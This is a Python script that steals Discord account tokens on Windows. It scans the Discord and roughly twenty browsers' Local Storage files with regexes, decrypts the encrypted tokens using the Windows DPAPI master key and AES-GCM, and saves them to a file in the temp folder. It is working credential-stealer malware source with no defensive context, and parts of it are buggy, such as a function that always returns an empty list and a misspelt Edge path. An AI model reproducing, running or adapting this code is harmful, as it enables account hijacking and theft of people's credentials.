from re import findall
import os
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from base64 import b64decode
global all_tokens
all_tokens = []
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
paths = {
    'Discord': local + '\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': local + '\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': local + '\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': local + '\\discordptb\\Local Storage\\leveldb\\',
    'Opera': local + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': local + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': roaming + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': roaming + '\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': roaming + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': roaming + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': roaming + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': roaming + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': roaming + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': roaming + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': roaming + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': roaming + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': roaming + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
    'Uran': roaming + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': roaming + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
}
path2 = roaming + '\\discord\\Local Storage\\leveldb\\'
path3 = roaming + '\\discord\\'
def gettokens(paths):
    tokens = []
    for file_name in os.listdir(paths):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{paths}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    all_tokens.append(token)
    return tokens
def get_master_key(path3):
    with open(f'{path3}Local State', 'r', encoding='utf-8') as f:
        key = loads(f.read())['os_crypt']['encrypted_key']
        return key
penis = get_master_key(path3)
def get_discord_token(path2):
    tokens_discord = []
    for subdir, dirs, files in os.walk(path2):
        for file in files:
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            else:
                try:
                    with open(f"{path2}{file}", "r+", errors='ignore') as f:
                        for i in f.readlines():
                            i.strip()
                            regex2 = '''dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\'''
                            regex3 = r']*"'
                            regex4 = regex2 + regex3
                            for values in findall(regex4, i):
                                tokens_discord.append(values)
                except:
                    pass
    for token in tokens_discord:
        all_tokens.append(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(penis)[5:]))
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        return "An error has occured.\n" + e
if __name__ == '__main__':
    for platfrom, path in paths.items():
        if not os.path.exists(path):
            continue
        for tokens in gettokens(path):
            print("finished")
    remove_dup = [*set(all_tokens)]
    with open(f"{temp}\\tokens.txt", "w", encoding="utf-8", errors="ignore") as f:
        for shits in remove_dup:
            f.write(shits + "\n")